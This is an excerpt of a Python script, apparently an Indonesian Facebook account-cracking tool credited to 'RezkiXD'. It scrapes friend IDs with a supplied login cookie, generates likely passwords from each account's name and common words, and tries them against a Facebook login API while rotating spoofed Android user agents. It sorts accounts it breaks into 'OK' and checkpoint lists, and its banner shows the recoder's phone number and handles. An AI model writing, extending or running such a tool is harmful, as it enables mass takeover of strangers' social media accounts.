...
for z in range(200):
	...
	device_oppo = random.choice(["CPH1723", "CPH1909","CPH1920", "CPH1933", "CPH1937","CPH1937", "CPH1945", "CPH1951", "CPH1969", "CPH1979", "CPH1983", "CPH2005", "CPH2023", "CPH2083", "CPH2003", "CPH2004","CPH2269"])
...
for xcTeam in range(1000):
	rr = random.randint
	rc = random.choice
	ngentot1 = f"Mozilla/5.0 (Linux; Android 13; RMX3395 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.125 Mobile Safari/537.36"
	...
	ngentot3 = f"Mozilla/5.0 (Linux; Android 10; CPH1938) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.141 Mobile Safari/537.36"
	if ngentot3 in ngentott:pass
	else:ngentott.append(ngentot3)
	ngentot4 = f"Mozilla/5.0 (Linux; Android 10; CPH1938) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.141 Mobile Safari/537.36"
...
{B2}╭──────────────────────╮{B2}╭───────────────╮{B2}╭────────────────────────────╮
{B2}│ {P2}Author : Fall Xavier {B2}│{B2}│ {P2}Version : 2.2 {B2}│{B2}│ {P2}Recode By : RezkiXD {B2}       │
...
class Menu:
	...
	def cek_login(self,cookie):
		try:
			...
			prints(Panel(f"""{M2}koneksi internet anda bermasalah, silahkan cek ulang jaringan anda kembali""",width=87,style=f"{color_panel}"))
			exit()
	...
	def menu(self):
		...
		yonkou.append(Panel(f" {K2}Nama Akun       {P2}: {H2}{nama}\n {K2}Status Pengguna {P2}: {H2}PRIVATE\n {K2}Ip Address      {P2}: {H2}{self.ip}\n {K2}Tanggal         {P2}: {H2}{tgl}",width=43,padding=(0,2),title=f"{M2}• {H2}• {K2}• {K2}Info-JandaPirang {M2}• {H2}• {K2}•",style=f"{color_panel}"))
		yonkou.append(Panel(f" {K2}Recode By {P2}: {H2}RezkiXD\n {K2}Github  {P2} : {H2}github.com/RezkiXD\n{K2} Facebook {P2}: {H2}Sabrina Cantii\n{K2} Whatsapp {P2}: {H2}+6283143115068",width=43,padding=(0,2),title=f"{M2}• {H2}• {K2}• {K2}Info-JandaPirang {M2}• {H2}• {K2}•",style=f"{color_panel}"))
		self.jol.print(Columns(yonkou))
		cetak(Panel(f"{H2}Sunshine ID, Rachel ID, Fall Xavier, ",width=87,title=f"{H2}Thanks To",style=f"{color_panel}"))
		...
		try:
			...
			for z in url.find_all("a",href=True):
				if "fref" in z.get("href"):
					...
					console.print(f" {H2}• {P2}sedang proses crack id, berhasil mendapatkan {len(tampung)} id....", end="\r")
...
class Crack:
					...
					try:
						...
						if len(nama)<=5:
							if len(depan)<3:
								...
								pwx.append("ganteng")
								pwx.append("sayangku123")
								pwx.append("jandapirang123")
								pwx.append("katasandi123")
								pwx.append("pontianak2288")
								pwx.append("semarang123")
						else:
							if len(depan)<3:
								pwx.append(nama)
								pwx.append(nama+"123")
	...
	def metode_api(self,email,pwx):
		prog.update(des,description=f" {H2}• {P2}[{H2}RezkiXD{P2}] {P2}[{P2}{str(self.loop)}{P2}/{P2}{len(tampung)}{P2}]{P2} [OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}] [")
		prog.advance(des)
		try:
			for pw in pwx:
				pw = pw.lower()
				...
				if "session_key" in post.text and "EAA" in post.text:
					...
					if user in self.ok or user in self.cp:
						...
						tree.add(Panel(f"{K2}  CP   {P2}",width=30,padding=(0,2),style=f"{color_cp}"))
...
def mengecek(user,pw):
	...
	ua = 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1809) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36'
